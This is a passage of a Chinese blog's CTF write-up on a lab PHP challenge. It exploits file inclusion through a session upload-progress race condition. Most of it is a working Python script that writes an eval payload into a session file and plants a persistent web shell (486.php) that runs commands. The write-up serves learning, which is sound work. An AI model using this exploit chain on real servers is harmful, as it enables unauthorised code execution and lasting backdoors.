]</span><br><span class="line">];</span><br></pre></td></tr></table></figure>



<p>知识了解完了，让我们把目光转向题目：</p>
<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>这里的关键点是 <code>$file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</code> ，文件名中的<code>.</code>会被替换，所以找文件名不包含<code>.</code>的文件： Session 文件。</p>
<p>已知 Session 文件的名字一般是<code>sess_xxx</code>的形式，那如何知道名字的后半部分呢？其实可以从响应头的 <code>Set-Cookie</code> 或请求头的 <code>Cookie</code> 字段中得到，例如：<code>PHPSESSID=abc123</code>，便得到了名字的后半部分<code>abc123</code>。（详见我之前写的关于 Session 的文章）</p>
<p>如果响应头中没有关于 Session 的内容，那么可以尝试自定义 SessionID 。部分服务器校验机制不可靠，不校验客户端发送的 SessionID 是否由服务端生成。由于服务端没有对应的 Session 文件，所以会生成与客户端自定义 SessionID 对应名字的 Session 文件，从而给攻击者可乘之机。</p>
<h3 id="Burp-Suite-解法"><a href="#Burp-Suite-解法" class="headerlink" title="Burp Suite 解法"></a>Burp Suite 解法</h3><p>操作不方便，不建议。</p>
<h2 id="Python-requests-解法"><a href="#Python-requests-解法" class="headerlink" title="Python requests 解法"></a>Python requests 解法</h2><p>此处借用大佬 Dedsec 的脚本，改了点功能，加了点注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cfeaa93b-4ae8-42b1-bbb3-fcccd32fe6f7.challenge.ctf.show/&quot;</span> <span class="comment"># 靶场URL</span></span><br><span class="line">session_id = <span class="string">&quot;mmk&quot;</span> <span class="comment"># 靶场安全机制不可靠，如果有来自客户端的不存在的 session ID 对应的 session 文件，会创建相应的文件</span></span><br><span class="line">data_session = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</span>&#125; <span class="comment"># 将要写入 session 的 payload，使 session 文件被包含时执行 $_POST[1]</span></span><br><span class="line">data_shell = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;file_put_contents(&#x27;/var/www/html/486.php&#x27;,&#x27;&lt;?php @eval($_GET[cmd]);?&gt;&#x27;);&quot;</span>&#125; <span class="comment"># 执行 read 函数时植入后门 486.php，该文件会执行 $_GET[cmd]</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: session_id&#125;</span><br><span class="line">fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span>) <span class="comment"># 文件大小要足够大，多点上传时间，为读取到 session 文件创造机会</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;gbc.png&#x27;</span>, fileBytes)&#125;</span><br><span class="line">exit_event = threading.Event() <span class="comment"># 定义全局事件，用于结束线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_event.is_set(): </span><br><span class="line">        session.post(url,  <span class="comment"># 上传文件，并利用 &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; 字段写入 payload</span></span><br><span class="line">                     data= data_session,</span><br><span class="line">                     cookies=cookies, </span><br><span class="line">                     files=files)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_event.is_set():</span><br><span class="line">        session.post(url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+session_id, <span class="comment"># 包含 session 文件，植入后门</span></span><br><span class="line">                     data= data_shell,</span><br><span class="line">                     cookies=cookies)</span><br><span class="line">        response = session.get(url + <span class="string">&quot;486.php&quot;</span>) <span class="comment"># 检测后门是否植入成功</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;awa 486 desu!\n&quot;</span>)</span><br><span class="line">            exit_event.<span class="built_in">set</span>() <span class="comment"># 植入后门成功，结束线程</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;状态码:<span class="subst">&#123;response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">session</span>): <span class="comment"># 最后查看目录内容，以便手动选择要查看的文件</span></span><br><span class="line">    response = session.get(url + <span class="string">&quot;486.php?cmd=system(&#x27;ls&#x27;);&quot;</span>) <span class="comment"># 注意之前的 url 变量末尾是否有 &quot;/&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># threading.Thread(): 创建一个新的线程对象</span></span><br><span class="line">            <span class="comment"># target=read: 指定线程要执行的函数是 read</span></span><br><span class="line">            <span class="comment"># args=(session,): 传递给 read 函数的参数，这里是一个元组，包含 session 变量（注意：(session,) 中的逗号是必须的，表示这是一个单元素元组）</span></span><br><span class="line">            <span class="comment"># .start(): 启动线程，使其开始执行目标函数</span></span><br><span class="line">        </span><br><span class="line">        exit_event.wait() <span class="comment"># 让当前线程阻塞，直到 exit_event 这个事件对象的内部标志被设置为 True</span></span><br><span class="line">        execute(session)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># 此处指作为脚本执行时会调用 main() 函数，作为模块引入时不会</span></span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（以上代码摘自<a target="_blank" rel="noopener" href="http://www.th-dedsec.top《条件竞争漏洞》2025.04.07)/">www.th-dedsec.top《条件竞争漏洞》2025.04.07）</a></p>
<p>最后根据文件目录的内容，在 URL 中手动构造 Payload 给 486.php 文件传参即可获得 flag 。</p>
<p><strong>为什么要植入后门？</strong></p>
<p>Session 文件里的文件上传数据不会自动删除，但为了防止服务端后续有删除 session 文件里的 <code>&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</code> 等数据的操作，需要一个长期存在的后门完成下一步。</p>
<p><strong><code>requests.session()</code> 做什么用？</strong></p>
<p>其实在这里没什么用，因为网站没有返回可供它管理的 Cookie ，详见我写的关于 requests 库的文章。</p>
<p><strong>全过程流程</strong></p>
<ul>
<li><p>向 Session 文件中写入 Payload。</p>
</li>
<li><p>向网站传参（既通过 URL 传参给 <code>$_GET[]</code> 数组，也通过 POST 传参给 <code>$_POST[]</code> 数组），包含  Session 文件并植入后门。</p>
</li>
<li><p>访问后门文件，通过 URL 传参执行 <code>ls</code> 命令，查看目录内容。</p>
</li>
<li><p>手动构造 Payload 查看 flag 文件。</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cma21qgom003zxwuhf3ks0q01" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP特性题目</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%86%E7%A0%B4/">爆破</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cookie/" rel="tag">Cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/URL/" rel="tag">URL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/requests/" rel="tag">requests</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" rel="tag">面向对象</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Session/" style="font-size: 13.33px;">Session</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/requests/" style="font-size: 10px;">requests</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 18.33px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 15px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 16.67px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 13.33px;">爆破</a> <a href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" style="font-size: 10px;">面向对象</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">SERVER数组</a>
          </li>
        
          <li>
            <a href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP 特性题目</a>
          </li>
        
          <li>
            <a href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/">利用或运算活字印刷</a>
          </li>
        
          <li>
            <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET 与 $_POST 数组相关知识</a>
          </li>
        
          <li>
            <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter 伪协议绕过 die（Web87）</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 Traveler2000<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>